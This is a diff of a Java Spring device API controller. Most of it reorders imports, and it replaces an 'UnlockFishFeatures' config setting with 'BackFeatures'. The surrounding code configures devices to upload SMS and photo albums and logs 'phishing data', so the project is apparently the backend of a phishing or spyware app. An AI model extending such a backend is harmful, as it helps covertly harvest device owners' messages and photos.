@@ -1,16 +1,22 @@
 package io.renren.modules.app.web.api;
 
-import java.util.Date;
-import java.util.List;
-import java.util.Objects;
-
-import javax.annotation.Resource;
-import javax.servlet.http.HttpServletRequest;
-
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
+import io.renren.common.constant.Constant;
+import io.renren.common.utils.IpUtils;
+import io.renren.common.utils.Result;
+import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
+import io.renren.modules.app.common.Utils;
+import io.renren.modules.app.context.DeviceContext;
 import io.renren.modules.app.entity.*;
-import io.renren.modules.app.mapper.FishTemplatesMapper;
 import io.renren.modules.app.service.*;
+import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.FishDataVo;
+import io.renren.modules.app.vo.ServerConfig;
+import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.sys.dao.SysParamsDao;
+import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -18,21 +24,11 @@ import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
-
-import io.renren.common.constant.Constant;
-import io.renren.common.utils.IpUtils;
-import io.renren.common.utils.Result;
-import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
-import io.renren.modules.app.common.Utils;
-import io.renren.modules.app.context.DeviceContext;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
-import io.renren.modules.sys.dao.SysParamsDao;
-import lombok.extern.slf4j.Slf4j;
+import javax.annotation.Resource;
+import javax.servlet.http.HttpServletRequest;
+import java.util.Date;
+import java.util.List;
+import java.util.Objects;
 
 @Slf4j
 @RestController
@@ -71,6 +67,7 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private FishDataService fishDataService;
+
 
 
     //注册设备
@@ -255,9 +252,9 @@ public class DeviceApiController extends BaseApiController {
 
         serverConfig.setFishOptions(dbDevice.getFishSwitch());
 
-        serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
         serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
         serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
+        serverConfig.setBackFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.BackFeatures));
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
@@ -396,6 +393,5 @@ public class DeviceApiController extends BaseApiController {
         log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
         return Result.toSuccess();
     }
-
 
 }
